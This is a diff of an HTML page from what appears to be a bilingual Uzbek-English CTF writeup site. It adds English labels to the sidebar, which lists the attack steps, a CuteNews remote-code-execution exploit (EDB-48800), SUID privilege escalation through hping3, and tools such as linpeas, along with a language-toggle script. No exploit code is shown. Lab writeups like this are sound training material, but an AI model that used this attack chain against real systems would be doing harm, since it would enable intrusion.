+      <span class="lbl" data-lang="uz">Holat</span><span class="lbl" data-lang="en">Status</span>
+      <span style="color:var(--green)">Rooted ✓</span>
+    </div>
     <div class="tags-row">
       <span class="tag">CuteNews</span><span class="tag">RCE</span>
       <span class="tag">file-upload</span><span class="tag">SUID</span>
@@ -416,28 +465,43 @@ command > whoami
   </div>
 
   <div class="sidebar-card">
-    <div class="sidebar-title">Mundarija</div>
-    <a href="#sec01" class="toc-item">01 — Razvedka</a>
-    <a href="#sec02" class="toc-item">02 — Zaiflik aniqlash</a>
-    <a href="#sec03" class="toc-item">03 — Initial access</a>
-    <a href="#sec04" class="toc-item">04 — Privilege escalation</a>
-    <a href="#sec05" class="toc-item">05 — Flaglar</a>
-    <a href="#sec06" class="toc-item">06 — Tahlil</a>
+    <div class="sidebar-title" data-lang="uz">Mundarija</div>
+    <div class="sidebar-title" data-lang="en">Contents</div>
+    <a href="#sec01" class="toc-item">
+      <span data-lang="uz">01 — Razvedka</span><span data-lang="en">01 — Reconnaissance</span>
+    </a>
+    <a href="#sec02" class="toc-item">
+      <span data-lang="uz">02 — Zaiflik aniqlash</span><span data-lang="en">02 — Vulnerability Assessment</span>
+    </a>
+    <a href="#sec03" class="toc-item">
+      <span data-lang="uz">03 — Initial access</span><span data-lang="en">03 — Initial Access</span>
+    </a>
+    <a href="#sec04" class="toc-item">
+      <span data-lang="uz">04 — Privilege escalation</span><span data-lang="en">04 — Privilege Escalation</span>
+    </a>
+    <a href="#sec05" class="toc-item">
+      <span data-lang="uz">05 — Flaglar</span><span data-lang="en">05 — Flags</span>
+    </a>
+    <a href="#sec06" class="toc-item">
+      <span data-lang="uz">06 — Tahlil</span><span data-lang="en">06 — Analysis</span>
+    </a>
   </div>
 
   <div class="sidebar-card">
-    <div class="sidebar-title">Foydalanilgan toollar</div>
-    <div class="tool-item"><span class="tool-name">masscan</span><span class="tool-desc"> — tez port scan</span></div>
-    <div class="tool-item"><span class="tool-name">nmap</span><span class="tool-desc"> — servis versiyalar</span></div>
+    <div class="sidebar-title" data-lang="uz">Foydalanilgan toollar</div>
+    <div class="sidebar-title" data-lang="en">Tools Used</div>
+    <div class="tool-item"><span class="tool-name">masscan</span><span class="tool-desc" data-lang="uz"> — tez port scan</span><span class="tool-desc" data-lang="en"> — fast port scan</span></div>
+    <div class="tool-item"><span class="tool-name">nmap</span><span class="tool-desc" data-lang="uz"> — servis versiyalar</span><span class="tool-desc" data-lang="en"> — service versions</span></div>
     <div class="tool-item"><span class="tool-name">gobuster</span><span class="tool-desc"> — dir enum</span></div>
-    <div class="tool-item"><span class="tool-name">searchsploit</span><span class="tool-desc"> — exploit qidirish</span></div>
+    <div class="tool-item"><span class="tool-name">searchsploit</span><span class="tool-desc" data-lang="uz"> — exploit qidirish</span><span class="tool-desc" data-lang="en"> — exploit search</span></div>
     <div class="tool-item"><span class="tool-name">48800.py</span><span class="tool-desc"> — CuteNews RCE</span></div>
     <div class="tool-item"><span class="tool-name">linpeas</span><span class="tool-desc"> — privesc enum</span></div>
     <div class="tool-item"><span class="tool-name">hping3</span><span class="tool-desc"> — SUID privesc</span></div>
   </div>
 
   <div class="sidebar-card">
-    <div class="sidebar-title">Referenslar</div>
+    <div class="sidebar-title" data-lang="uz">Referenslar</div>
+    <div class="sidebar-title" data-lang="en">References</div>
     <a href="https://gtfobins.github.io/gtfobins/hping3/" class="toc-item" target="_blank">GTFOBins — hping3</a>
     <a href="https://www.exploit-db.com/exploits/48800" class="toc-item" target="_blank">EDB-48800 — CuteNews RCE</a>
     <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid" class="toc-item" target="_blank">HackTricks — SUID</a>
@@ -446,8 +510,23 @@ command > whoami
 </div>
 
 <footer>
-  <a href="../../../index.html">← Barcha writeuplar</a> &nbsp;|&nbsp;
-  0xAkatsuki &nbsp;|&nbsp; <span style="color:var(--green3)">O'zbekiston 🇺🇿</span>
+  <a href="/akatsuki.github.io/index.html" data-lang="uz">← Barcha writeuplar</a>
+  <a href="/akatsuki.github.io/index.html" data-lang="en">← All writeups</a>
+  &nbsp;|&nbsp; 0xAkatsuki
 </footer>
+
+<script>
+function setLang(lang) {
+  document.body.className = 'lang-' + lang;
+  document.querySelectorAll('.lang-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.textContent === lang.toUpperCase());
+  });
+  try { localStorage.setItem('lang', lang); } catch(e) {}
+}
+try {
+  const saved = localStorage.getItem('lang');
+  if (saved) setLang(saved);
+} catch(e) {}
+</script>
 </body>
 </html>
